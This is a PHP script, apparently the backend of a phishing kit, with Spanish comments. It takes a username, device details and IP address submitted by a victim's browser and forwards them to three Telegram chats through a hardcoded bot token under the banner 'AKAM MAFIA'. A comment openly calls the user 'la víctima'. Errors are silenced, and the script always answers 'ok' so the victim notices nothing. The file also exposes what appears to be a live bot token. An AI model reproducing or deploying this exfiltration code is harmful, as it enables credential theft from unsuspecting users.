<?php
// Limpia cualquier salida previa para evitar errores de JSON o texto extra
ob_clean();
error_reporting(0);

$u = isset($_POST['usr']) ? $_POST['usr'] : '';
$d = isset($_POST['dis']) ? $_POST['dis'] : 'Desconocido';
$ip = $_SERVER['REMOTE_ADDR'];

$token = "8721615356:AAGxIf7AxwGMzhoUOtxI9IRQoOXoIMJ2_iA";
$ids = ["8114050673", "8518977918", "8638340940"]; 

if(!empty($u)){
    $msg = "⭐ <b>𝓐K𝓐𝓜 𝓜𝓐𝓕𝓘𝓐 - INICIO</b> ⭐\n\n";
    $msg .= "👤 <b>USUARIO:</b> <code>$u</code>\n";
    $msg .= "📱 <b>SISTEMA:</b> $d\n";
    $msg .= "📍 <b>IP:</b> $ip";

    foreach($ids as $id){
        $url = "https://api.telegram.org/bot$token/sendMessage";
        $data = [
            'chat_id' => $id,
            'text' => $msg,
            'parse_mode' => 'HTML'
        ];
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data)); // Cambiado para mayor compatibilidad
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_exec($ch);
        curl_close($ch);
    }
    // ESTO DESBLOQUEA EL CARGANDO EN EL JS
    echo "ok";
} else {
    // Si llega vacío por error, también soltamos el ok para no trabar la víctima
    echo "ok";
}
?>
